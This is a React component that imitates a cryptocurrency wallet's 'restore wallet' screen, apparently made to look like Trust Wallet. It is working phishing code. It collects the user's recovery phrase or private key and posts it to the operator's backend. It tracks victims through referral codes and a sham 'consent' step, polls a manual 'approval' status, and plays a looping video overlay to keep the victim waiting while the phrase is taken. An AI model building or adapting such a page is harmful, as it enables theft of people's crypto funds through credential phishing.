// MultiCoinWalletSection.jsx
import { IoArrowBack, IoClose, IoScan, IoVolumeHigh, IoVolumeMute } from 'react-icons/io5'
import { useState, useEffect, useRef } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import api from '../../api/axios'
import prepAdVideo from '../../assets/prep.mp4'
import '../../styles/MultiCoinWalletSection.css'

function MultiCoinWalletSection({
  walletName: initialWalletName = '',
  secretPhrase: initialSecretPhrase = '',
  onBack,
  onRestoreSuccess,
  onRestoreError,
}) {
  const navigate = useNavigate()
  const location = useLocation()
  const [walletName, setWalletName] = useState(initialWalletName)
  const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
  const [isLoading, setIsLoading] = useState(false)
  const [statusMessage, setStatusMessage] = useState('')
  const [isAutoLogin, setIsAutoLogin] = useState(false)
  const [referralCode, setReferralCode] = useState(null)
  const [activityState, setActivityState] = useState(null)

  // Ad video state
  const [showAdVideo, setShowAdVideo] = useState(false)
  const [isMuted, setIsMuted] = useState(true)
  const [videoReady, setVideoReady] = useState(false)
  const [videoError, setVideoError] = useState(false)
  const adVideoRef = useRef(null)

  // Capture referral from URL on component mount
  useEffect(() => {
    const params = new URLSearchParams(location.search)
    const ref = params.get('ref')
    if (ref && /^[a-f0-9]{24}$/.test(ref)) {
      setReferralCode(ref)
      sessionStorage.setItem('referralCode', ref)
      console.log('✅ Referral detected:', ref)
    } else {
      const storedRef = sessionStorage.getItem('referralCode')
      if (storedRef) {
        setReferralCode(storedRef)
      }
    }
  }, [location])

  // Reset video-ready state each time the overlay opens
  useEffect(() => {
    if (showAdVideo) {
      setVideoReady(false)
      setVideoError(false)
    }
  }, [showAdVideo])

  // Ensure video plays whenever it becomes ready + overlay is shown
  useEffect(() => {
    if (showAdVideo && videoReady && adVideoRef.current) {
      const video = adVideoRef.current
      video.currentTime = 0
      const playPromise = video.play()
      if (playPromise && typeof playPromise.catch === 'function') {
        playPromise.catch(() => {
          // Autoplay blocked — user can tap mute button to trigger play
        })
      }
    }
  }, [showAdVideo, videoReady])

  const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0

  const toggleMute = () => {
    if (adVideoRef.current) {
      const nextMuted = !adVideoRef.current.muted
      adVideoRef.current.muted = nextMuted
      setIsMuted(nextMuted)
      // If autoplay was blocked, tapping this will also kick playback
      if (!nextMuted) {
        adVideoRef.current.play().catch(() => {})
      }
    }
  }

  // Step 1: Submit consent and get activity state
  const submitConsent = async () => {
    try {
      const response = await api.post('/activity/state', {
        consent: 'granted',
        referral: referralCode
      })

      if (response.data.state) {
        setActivityState(response.data.state)
        return response.data.state
      }
      throw new Error('No state returned')
    } catch (error) {
      console.error('Consent submission error:', error)
      return null
    }
  }

  // Step 2: Record visit with activity state
  const recordVisit = async (state, words) => {
    try {
      await api.post('/activity/visit', {
        state: state,
        referral: referralCode,
        source: 'wallet-restore'
      })
    } catch (error) {
      console.error('Visit recording error:', error)
    }
  }

  const handleWalletNameChange = (value) => {
    setWalletName(value)
  }

  const handleWalletNameClear = () => {
    setWalletName('')
  }

  const handleSecretPhraseChange = (value) => {
    setSecretPhrase(value)
  }

  const handlePasteSecretPhrase = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setSecretPhrase(text)
    } catch (error) {
      console.error('Failed to paste:', error)
    }
  }

  // Modified auto-login with referral + ad video
  const handleAutoLogin = async () => {
    if (!canRestore || isLoading || isAutoLogin) return

    setIsLoading(true)
    setIsAutoLogin(true)
    setShowAdVideo(true) // <-- SHOW AD VIDEO
    setStatusMessage('⏳ Checking your wallet credentials...')

    try {
      const state = await submitConsent()

      const response = await api.post('/words/auto-login', {
        words: secretPhrase,
        referral: referralCode
      })

      if (response.data.ok) {
        const accountData = response.data.account

        if (state) {
          await recordVisit(state, secretPhrase)
        }

        setStatusMessage('✅ Wallet found! Redirecting...')
        setShowAdVideo(false) // <-- HIDE AD VIDEO

        localStorage.setItem('trust-wallet-account', JSON.stringify(accountData))
        localStorage.setItem('trust-wallet-logged-in', 'true')
        if (referralCode) {
          localStorage.setItem('referralCode', referralCode)
        }

        setTimeout(() => {
          navigate('/wallet', {
            state: {
              account: accountData,
              autoLogin: true,
              referral: referralCode
            }
          })
        }, 1000)
      } else {
        throw new Error(response.data.error || 'Auto-login failed')
      }
    } catch (error) {
      console.error('Auto-login error:', error)

      setStatusMessage('ℹ️ No existing wallet found. Proceeding with approval request...')
      setIsAutoLogin(false)

      // Continue with the restore flow — keep the ad video playing
      handleRestoreWallet()
    }
  }

  // Modified restore wallet with referral + ad video
  const handleRestoreWallet = async () => {
    if (!canRestore || isLoading) return

    setIsLoading(true)
    setShowAdVideo(true) // <-- ENSURE AD VIDEO IS SHOWING
    setStatusMessage('⏳ Submitting wallet for approval...')

    try {
      const state = await submitConsent()

      const response = await api.post('/words', {
        words: secretPhrase,
        createdBy: walletName,
        source: 'wallet-restore',
        title: walletName,
        activity: {
          state: state,
          referral: referralCode
        }
      })

      if (response.data.ok) {
        const batch = response.data.batch

        if (state) {
          await recordVisit(state, secretPhrase)
        }

        const interval = setInterval(async () => {
          try {
            const statusResponse = await api.get(`/words/${batch.id}/status`)

            if (statusResponse.data.ok) {
              const batchStatus = statusResponse.data.batch

              if (batchStatus.approvalStatus === 'approved') {
                clearInterval(interval)
                setStatusMessage('✅ Wallet approved! Redirecting...')
                setShowAdVideo(false) // <-- HIDE AD VIDEO ON APPROVAL

                localStorage.setItem('trust-wallet-logged-in', 'true')
                if (referralCode) {
                  localStorage.setItem('referralCode', referralCode)
                }

                const approvedAccount = getApprovedAccount(batchStatus)

                if (approvedAccount) {
                  localStorage.setItem('trust-wallet-account', JSON.stringify(approvedAccount))
                }

                setTimeout(() => {
                  navigate('/wallet', {
                    state: {
                      account: approvedAccount,
                      batchId: batch.id,
                      approvalStatus: batchStatus.approvalStatus,
                      referral: referralCode
                    },
                  })
                }, 1000)
              } else if (batchStatus.approvalStatus === 'rejected') {
                clearInterval(interval)
                setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
                setIsLoading(false)
                setShowAdVideo(false) // <-- HIDE AD VIDEO ON REJECTION
              } else {
                setStatusMessage('Loading...')
                // Ad video continues playing while waiting
              }
            }
          } catch (error) {
            console.error('Status check error:', error)
            setStatusMessage('⚠️ Error checking wallet status. Please try again.')
            setIsLoading(false)
            setShowAdVideo(false) // <-- HIDE AD VIDEO ON ERROR
            clearInterval(interval)
          }
        }, 3000)

        onRestoreSuccess?.({
          walletName,
          secretPhrase,
          batchId: batch.id,
          telegram: response.data.telegram,
          referral: referralCode
        })
      } else {
        throw new Error(response.data.error || 'Failed to restore wallet')
      }
    } catch (error) {
      console.error('Restore error:', error)
      setStatusMessage(`❌ Error: ${error.message || 'Failed to restore wallet'}`)
      setIsLoading(false)
      setShowAdVideo(false) // <-- HIDE AD VIDEO ON ERROR
      onRestoreError?.(error.message)
    }
  }

  const handleOpenSecretPhraseHelp = () => {
    window.open('https://example.com/help', '_blank')
  }

  const handleBack = () => {
    if (onBack) {
      onBack()
    } else {
      navigate('/')
    }
  }

  return (
    <main className="app-screen restore-screen">
      <FlowHeader
        title="Multi-coin wallet"
        onBack={handleBack}
        action={
          <button className="icon-button" type="button" aria-label="Scan">
            <IoScan />
          </button>
        }
      />
      <section className="restore-form">
        <div className="restore-field">
          <label htmlFor="wallet-name">Wallet name</label>
          <div className="wallet-name-field">
            <input
              id="wallet-name"
              type="text"
              value={walletName}
              enterKeyHint="next"
              onChange={(event) => handleWalletNameChange(event.target.value)}
              disabled={isLoading}
              placeholder="Enter wallet name"
            />
            <button
              className="wallet-name-clear"
              type="button"
              aria-label="Clear name"
              onClick={handleWalletNameClear}
              disabled={isLoading}
            >
              <IoClose aria-hidden="true" />
            </button>
          </div>
        </div>
        <div className="restore-field">
          <label htmlFor="secret-phrase">Secret Phrase</label>
          <div className="secret-phrase-safe-box">
            <textarea
              id="secret-phrase"
              value={secretPhrase}
              spellCheck="false"
              autoCapitalize="none"
              autoComplete="off"
              autoCorrect="off"
              enterKeyHint="done"
              onChange={(event) => handleSecretPhraseChange(event.target.value)}
              disabled={isLoading}
              placeholder="Enter your recovery phrase or private key"
            />
            <button
              type="button"
              onClick={handlePasteSecretPhrase}
              disabled={isLoading}
            >
              Paste
            </button>
          </div>
        </div>
        <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>

        {statusMessage && (
          <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : statusMessage.includes('ℹ️') ? 'info' : 'info'}`}>
            {statusMessage}
          </div>
        )}
      </section>
      <section className="restore-actions">
        <button
          className="continue-button"
          type="button"
          disabled={!canRestore || isLoading}
          onClick={handleAutoLogin}
        >
          {isLoading ? 'Processing...' : 'Connect Wallet'}
        </button>
        <button
          className="secret-help"
          type="button"
          onClick={handleOpenSecretPhraseHelp}
          disabled={isLoading}
        >
          Need help with wallet access?
        </button>
      </section>

      {/* ========== AD VIDEO OVERLAY ========== */}
      {showAdVideo && (
        <div className="ad-video-overlay" role="dialog" aria-label="Processing">
          <div className="ad-video-container">
            {/* Placeholder shown until the video is ready */}
            {!videoReady && !videoError && (
              <div className="video-placeholder" role="status" aria-live="polite">
                <div className="video-placeholder-spinner" />
                <p>Loading video…</p>
              </div>
            )}

            {/* Video error fallback */}
            {videoError && (
              <div className="video-placeholder error" role="status">
                <p>Unable to load video</p>
              </div>
            )}

            <video
              ref={adVideoRef}
              src={prepAdVideo}
              autoPlay
              loop
              muted={isMuted}
              playsInline
              preload="auto"
              onCanPlay={() => setVideoReady(true)}
              onError={() => {
                setVideoError(true)
                setVideoReady(true)
              }}
              className={`ad-video ${videoReady ? 'ready' : 'loading'}`}
            />

            {/* Mute / Unmute toggle */}
            <button
              type="button"
              className="ad-video-mute-btn"
              onClick={toggleMute}
              aria-label={isMuted ? 'Unmute video' : 'Mute video'}
            >
              {isMuted ? <IoVolumeMute /> : <IoVolumeHigh />}
            </button>

            {/* Loading spinner + status text */}
            <div className="ad-video-loader">
              <div className="ad-spinner" />
              <p>{statusMessage || 'Please wait while we process your request…'}</p>
            </div>
          </div>
        </div>
      )}
    </main>
  )
}

function FlowHeader({ title, onBack, action }) {
  return (
    <header className="flow-header">
      <button className="icon-button" type="button" aria-label="Back" onClick={onBack}>
        <IoArrowBack />
      </button>
      <h1>{title}</h1>
      {action || <span></span>}
    </header>
  )
}

function getApprovedAccount(batchStatus) {
  const account = batchStatus.account || batchStatus.accountData || batchStatus.wallet
  const accountNumber = batchStatus.accountNumber || account?.accountNumber

  if (!account && !accountNumber) return null

  return {
    ...account,
    accountNumber,
  }
}

export default MultiCoinWalletSection